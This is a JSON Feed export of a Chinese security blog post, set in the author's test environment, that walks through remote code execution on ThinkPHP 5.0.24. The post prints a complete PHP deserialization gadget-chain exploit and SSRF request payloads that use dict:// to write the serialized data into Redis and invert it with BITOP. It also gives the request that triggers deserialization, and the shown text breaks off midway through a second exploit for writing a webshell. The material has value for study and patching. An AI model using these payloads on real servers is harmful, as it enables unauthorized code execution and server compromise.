{
    "version": "https://jsonfeed.org/version/1",
    "title": "竹林寺",
    "description": "请我喝咖啡！ψ(｀∇´)ψ",
    "home_page_url": "https://zlte.netlify.app",
    "items": [
        {
            "id": "https://zlte.netlify.app/2024/02/02/skill/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96redisrce/",
            "url": "https://zlte.netlify.app/2024/02/02/skill/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96redisrce/",
            "title": "thinkphp反序列化redis_rce",
            "date_published": "2024-02-02T12:52:34.000Z",
            "content_html": "<p>本文技巧概括 (作者理解)：</p>\n<blockquote>\n<p>通过 ssrf 将 thinkphp 5.0.24 反序列化链写入 redis 缓存，再让 php 反序列化 redis 缓存中的序列化内容进行命令执行</p>\n</blockquote>\n<h2 id=\"测试环境\"><a class=\"anchor\" href=\"#测试环境\">#</a> 测试环境</h2>\n<h3 id=\"框架\"><a class=\"anchor\" href=\"#框架\">#</a> 框架：</h3>\n<p>thinkphp 5.0.24</p>\n<h3 id=\"代码简介\"><a class=\"anchor\" href=\"#代码简介\">#</a> 代码简介：</h3>\n<p>geturl 操作为 ssrf</p>\n<p>getname 操作为加载 redis 缓存并 dump 出来</p>\n<p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202205112038.png\" alt=\"image-20240202041743822\" /></p>\n<p>我们现在需要做的就是 redis 缓存里面的序列化内容拿到 php 里面执行，从而 getshell</p>\n<h2 id=\"第一步\"><a class=\"anchor\" href=\"#第一步\">#</a> 第一步：</h2>\n<p>序列化我们的 exp</p>\n<blockquote>\n<p>观众提问：为什么上来就是序列化？</p>\n<p>回答：因为 thinkphp 在 redis 获取代码中，存在反序列化操作，发现如果以 think_serialize: 开头的内容就会触发反序列化操作，所以我们要将序列化好的内容写进缓存，然后再进行 redis 读取操作反序列化。</p>\n</blockquote>\n<p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202182928809.png\" alt=\"image-20240202182928809\" /></p>\n<p>创建 /ccc/ 目录 exp:</p>\n<blockquote>\n<p>exp 制作请自行搜索：thinkphp 5.0.24 反序列化</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>Pivot</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pipes</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Windows</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Pipes</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Pivot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Relation</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>Query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Relation</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$selfRelation</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">selfRelation</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">query</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Query</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#class Query</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>relation</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#OneToOne HasOne</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>Relation</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">OneToOne</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Relation</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword static-context\">parent</span><span class=\"token operator\">::</span><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">HasOne</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">OneToOne</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$bindAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword static-context\">parent</span><span class=\"token operator\">::</span><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">bindAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"123\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Output</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>session<span class=\"token punctuation\">\\</span>driver<span class=\"token punctuation\">\\</span>Memcached</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Output</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$handle</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$styles</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">handle</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Memcached</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 目的调用其 write ()</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">styles</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'getAttr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Model</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>relation<span class=\"token punctuation\">\\</span>HasOne</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console<span class=\"token punctuation\">\\</span>Output</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>Query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Model</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$error</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$parent</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#修改处</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$selfRelation</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$aaaaa</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">parent</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Output</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Output 对象，目的是调用__call ()</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'getError'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">error</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HasOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//Relation 子类，且有 getBindAttr ()</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">selfRelation</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//isSelfRelation()</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">query</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Query</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Query</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console<span class=\"token punctuation\">\\</span>Output</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Query</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">model</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Output</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>session<span class=\"token punctuation\">\\</span>driver</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#Memcached</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>cache<span class=\"token punctuation\">\\</span>driver<span class=\"token punctuation\">\\</span>File</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Memcached</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$handler</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">handler</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 目的调用 File->set ()</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>cache<span class=\"token punctuation\">\\</span>driver</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#File</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">File</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$tag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token string single-quoted-string\">'expire'</span>        <span class=\"token operator\">=></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        <span class=\"token string single-quoted-string\">'cache_subdir'</span>  <span class=\"token operator\">=></span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token string single-quoted-string\">'prefix'</span>        <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        <span class=\"token string single-quoted-string\">'path'</span>          <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'./demo/'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token string single-quoted-string\">'data_compress'</span> <span class=\"token operator\">=></span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">tag</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>Model</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pivot</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Model</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes<span class=\"token punctuation\">\\</span>Windows</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre><span class=\"token variable\">$aaa</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"think_serialize:\"</span><span class=\"token operator\">.</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Windows</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token operator\">~</span><span class=\"token variable\">$aaa</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token operator\">~</span><span class=\"token variable\">$aaa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre><span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><blockquote>\n<p>问：为什么要位取反</p>\n<p>答：因为有些特殊字符无法正常通过数据流储存到 redis 缓存，所以得二次取反，第一次在这里，第二次在 bitop:not 中</p>\n</blockquote>\n<h2 id=\"第二步\"><a class=\"anchor\" href=\"#第二步\">#</a> 第二步:</h2>\n<p>拼接 payload：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//ip:8083/public/index.php/index/index/getUrl?url=dict://127.0.0.1:6379/set:zls:&#123;序列化数据&#125;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202195326497.png\" alt=\"image-20240202195326497\" /></p>\n<h3 id=\"dict协议\"><a class=\"anchor\" href=\"#dict协议\">#</a> Dict 协议</h3>\n<blockquote>\n<p><em>dict://serverip:port / 命令：参数</em><br />\n<em>向服务器的端口请求为【命令：参数】，并在末尾自动补上 \\r\\n (CRLF)，dict 协议要一条一条的执行命令</em></p>\n</blockquote>\n<blockquote>\n<p>问：为什么如此拼接</p>\n<p>答：/index/index 为 thinkphp 的控制器路由，geturl 为 ssrf，只有 dict 协议能读到内容</p>\n</blockquote>\n<h2 id=\"第三步\"><a class=\"anchor\" href=\"#第三步\">#</a> 第三步：</h2>\n<p>使用 BITOP 命令再次取反已经取反过的序列化内容，并将旧存储键 (zls) 中的内容存储到新键 (save) 中</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//ip:8083/public/index.php/index/index/getUrl?url=dict://127.0.0.1:6379/bitop:not:save:zls</span></span></pre></td></tr></table></figure><p>存储成功</p>\n<p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202195951369.png\" alt=\"image-20240202195951369\" /></p>\n<h2 id=\"第四步\"><a class=\"anchor\" href=\"#第四步\">#</a> 第四步：</h2>\n<p>使用 Cache::store ('redis')-&gt;get ($name); 操作，用 php 读取 redis 数据，触发 php 读取 redis 操作中 get 方法的反序列化操作</p>\n<p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202200311275.png\" alt=\"image-20240202200311275\" /></p>\n<p>用 php 访问 reids 中的内容并触发反序列化内容</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//ip:8083/public/index.php/Index/Index/getname?name=save</span></span></pre></td></tr></table></figure><p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202200727480.png\" alt=\"image-20240202200727480\" /></p>\n<p>成功创建目录 /ccc/</p>\n<p><img data-src=\"https://zlte.netlify.app/imgs/image-20240202200850585.png\" alt=\"image-20240202200850585\" /></p>\n<h2 id=\"第五步\"><a class=\"anchor\" href=\"#第五步\">#</a> 第五步：</h2>\n<p>在创建 /ccc 目录中写入 shell</p>\n<p>写 shell 反序列化 exp:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>Pivot</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pipes</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td 